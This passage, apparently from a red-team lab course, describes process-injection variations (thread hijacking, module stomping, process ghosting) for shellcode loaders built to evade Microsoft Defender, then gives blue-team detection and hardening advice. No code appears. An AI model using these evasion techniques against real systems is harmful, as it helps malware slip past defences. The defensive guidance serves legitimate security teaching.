| Process injection | Runs code inside legitimate process | Loaders 05/06 |

Document 10 combines all of these into Loader 08, the first loader that uses process injection and survives Defender completely.

## Common Threats and Variations

### Variation 1: Thread Hijacking Instead of CreateRemoteThread

Instead of creating a new thread in the target process, you can hijack an existing thread. You suspend one of the target process's threads, change its instruction pointer (the register that tells the CPU which code to run next) to point to your shellcode, and then resume the thread. The thread was already running, so no new thread is created. Defender watches for CreateRemoteThread, but thread hijacking does not call that function.

The risk with thread hijacking is stability. If the thread was in the middle of doing something important, redirecting it to your shellcode can crash the process. You need to save the thread's original state and restore it after your shellcode runs.

### Variation 2: Module Stomping

Instead of allocating new memory in the target process, you overwrite the code section of a DLL that is already loaded in the target process but is not being actively used. This is called module stomping. The benefit is that your shellcode lives in memory that belongs to a legitimate DLL, so memory scanners see a known DLL's address range and do not flag it. The downside is that you need to find a DLL that is loaded but not actively used, and overwriting it can cause crashes if the process tries to use that DLL later.

### Variation 3: Process Ghosting

Process ghosting is a technique where you create a temporary file, write your malicious executable to it, create a process from it, and then delete the file before the process starts. When Defender tries to scan the file, it is already deleted. The process runs from the in-memory copy of the deleted file. This defeats file-based scanning but requires very precise timing and is detected by some Defender versions that scan the file before the delete can complete.

## Detection and Defense (Blue Team Perspective)

**Monitor for cross-process memory operations.** A process calling OpenProcess + VirtualAllocEx + WriteProcessMemory + CreateRemoteThread on another process is a clear injection pattern. Legitimate programs that do this are debuggers and accessibility tools. Most business software never touches another process's memory.

Blue team action: alert on any process that calls OpenProcess with PROCESS_VM_WRITE or PROCESS_ALL_ACCESS on a process it did not create. Exception-list known legitimate tools (debuggers, antimalware).

**Monitor for CREATE_SUSPENDED processes followed by APC queuing.** Creating a process in a suspended state and then queuing an APC before resuming it is the Early Bird pattern. Some legitimate software (like .NET's process spawning) creates suspended processes, but adding an APC before resume is almost always malicious.

Blue team action: alert on CreateProcess(SUSPENDED) followed by QueueUserAPC to the new process's main thread, especially when VirtualAllocEx and WriteProcessMemory are called between the creation and the resume.

**Use Protected Process Light (PPL).** Windows can mark certain processes as "protected". Protected processes cannot be opened with PROCESS_ALL_ACCESS by non-protected processes. If you configure system services to run as PPL, injection into those services fails because OpenProcess is denied.

Blue team action: configure critical services (lsass.exe, csrss.exe, services.exe) to run with PPL protection. This prevents most injection techniques from targeting those processes.

**Deploy Credential Guard.** Windows Credential Guard runs the LSASS process in a virtualization-based security container. Even if an attacker gets admin access, they cannot read LSASS memory or inject into it. This protects against credential theft via process injection.

Blue team action: enable Credential Guard on all domain-joined workstations. This eliminates LSASS as a target for process injection.

## What Comes Next

Document 10 (lab/materials/10_combined_evasion.md) puts everything together. Loader 08 is the combined evasion loader that patches ETW (Loader 07), patches AMSI (Loader 04), decrypts shellcode (Loader 02), resolves functions dynamically (Loader 03), and executes shellcode using process injection (Loaders 05/06). This is the first loader that uses all techniques together and survives Defender completely. You will get a callback from inside a legitimate process with Defender at full defaults and no detection alerts.
